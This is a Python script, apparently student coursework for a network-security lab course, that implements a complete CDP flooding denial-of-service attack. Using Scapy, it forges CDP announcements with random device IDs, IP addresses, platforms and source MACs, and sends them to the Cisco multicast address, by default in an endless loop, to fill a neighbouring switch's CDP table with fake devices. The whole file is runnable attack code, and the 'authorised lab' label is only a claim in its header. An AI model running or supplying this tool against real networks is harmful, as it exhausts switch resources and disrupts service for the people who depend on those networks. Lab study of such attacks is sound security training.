#!/usr/bin/env python3
"""
CDP DoS Attack - Laboratorio Autorizado
Autor: Enmanuel Feliz Soto
Matricula: 20251402
ITLA - Seguridad en Redes
"""

import os
import sys
import time
import signal
import random
import string
import argparse

running = True

def signal_handler(sig, frame):
    global running
    running = False
    print("\n[!] Deteniendo ataque...")

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

def require_root():
    if os.geteuid() != 0:
        print("[!] Ejecutar como root: sudo python3 script.py")
        sys.exit(1)

def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def random_ip():
    return f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"

def random_mac():
    return "%02x:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0,255) for _ in range(6))

def build_cdp_packet(iface, src_mac):
    from scapy.all import Ether, LLC, SNAP, Raw, sendp, conf

    # CDP Multicast destination
    dst = "01:00:0c:cc:cc:cc"

    # CDP TLV builder
    def tlv(type_id, value):
        if isinstance(value, str):
            value = value.encode()
        length = 4 + len(value)
        return type_id.to_bytes(2, 'big') + length.to_bytes(2, 'big') + value

    device_id   = random_string(12)
    port_id     = f"FastEthernet0/{random.randint(0,23)}"
    platform    = f"Cisco IOS {random.randint(12,15)}.{random.randint(0,9)}"
    version     = f"Cisco Internetwork Operating System Version {random.randint(12,15)}.{random.randint(0,9)}(1)"
    ip_addr     = random_ip()

    # Address TLV (type 2): protocol=IPv4, addr
    ip_bytes    = bytes(int(x) for x in ip_addr.split('.'))
    addr_tlv    = (1).to_bytes(4, 'big')  # address count
    addr_tlv   += (1).to_bytes(2, 'big')  # protocol type: NLPID
    addr_tlv   += (1).to_bytes(1, 'big')  # protocol length
    addr_tlv   += (0xcc).to_bytes(1, 'big')  # IP NLPID
    addr_tlv   += (4).to_bytes(2, 'big')  # address length
    addr_tlv   += ip_bytes

    payload  = b''
    payload += (0xff).to_bytes(1, 'big')  # CDP version
    payload += (0xb4).to_bytes(1, 'big')  # TTL = 180
    payload += (0x00).to_bytes(2, 'big')  # checksum placeholder
    payload += tlv(0x0001, device_id)
    payload += tlv(0x0002, addr_tlv)
    payload += tlv(0x0003, port_id)
    payload += tlv(0x0004, b'\x00\x00\x00\x10')  # capabilities: Router
    payload += tlv(0x0005, version)
    payload += tlv(0x0006, platform)

    # Recalculate checksum (simple ones complement)
    def checksum(data):
        if len(data) % 2:
            data += b'\x00'
        s = 0
        for i in range(0, len(data), 2):
            s += (data[i] << 8) + data[i+1]
        while s >> 16:
            s = (s & 0xFFFF) + (s >> 16)
        return (~s) & 0xFFFF

    cksum = checksum(payload)
    payload = payload[:2] + cksum.to_bytes(2, 'big') + payload[4:]

    pkt = (
        Ether(src=src_mac, dst=dst) /
        LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) /
        SNAP(OUI=0x00000c, code=0x2000) /
        Raw(load=payload)
    )
    return pkt

def main():
    parser = argparse.ArgumentParser(description="CDP DoS Attack - Lab Autorizado")
    parser.add_argument("-i", "--iface", default="eth0", help="Interfaz de red (default: eth0)")
    parser.add_argument("-c", "--count", type=int, default=0, help="Numero de paquetes (0=infinito)")
    parser.add_argument("--delay", type=float, default=0.01, help="Delay entre paquetes en segundos (default: 0.01)")
    args = parser.parse_args()

    require_root()

    from scapy.all import get_if_hwaddr, sendp, conf
    conf.verb = 0
    conf.iface = args.iface

    try:
        real_mac = get_if_hwaddr(args.iface)
    except Exception:
        print(f"[!] No se pudo obtener MAC de {args.iface}")
        sys.exit(1)

    print(f"""
+--------------------------------------------------------------+
|              CDP DoS ATTACK - Laboratorio Autorizado         |
|--------------------------------------------------------------|
|  Inunda tabla CDP del vecino con dispositivos falsos         |
+--------------------------------------------------------------+
  Interfaz:   {args.iface}
  MAC real:   {real_mac}
  Paquetes:   {'Infinito' if args.count == 0 else args.count}
  Delay:      {args.delay}s
+--------------------------------------------------------------+
""")

    input("[*] Presiona Enter para iniciar o Ctrl+C para cancelar...")

    sent = 0
    start = time.time()

    print("[*] Ataque iniciado - Ctrl+C para detener\n")

    try:
        while running:
            src_mac = random_mac()
            pkt = build_cdp_packet(args.iface, src_mac)
            sendp(pkt, iface=args.iface, verbose=False)
            sent += 1

            print(f"\r[+] Paquetes CDP enviados: {sent}  |  MAC: {src_mac}", end="", flush=True)

            if args.count > 0 and sent >= args.count:
                break

            if args.delay > 0:
                time.sleep(args.delay)

    except KeyboardInterrupt:
        pass

    elapsed = time.time() - start
    print(f"\n\n[+] Ataque finalizado")
    print(f"    Paquetes enviados: {sent}")
    print(f"    Tiempo total:      {elapsed:.1f}s")
    print(f"    Tasa:              {sent/max(elapsed,1):.1f} pkt/s")

if __name__ == "__main__":
    main()
